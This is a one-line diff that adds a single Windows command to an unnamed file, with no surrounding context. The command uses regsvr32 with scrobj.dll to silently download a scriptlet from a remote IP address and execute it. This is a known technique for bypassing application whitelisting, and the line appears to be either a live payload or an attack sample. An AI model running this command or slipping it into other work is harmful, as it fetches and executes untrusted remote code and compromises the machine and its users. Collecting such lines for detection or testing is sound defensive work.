@@ -1,0 +1,1 @@
+regsvr32 /u /s /i:http://129.21.228.140/f1.dll scrobj.dll
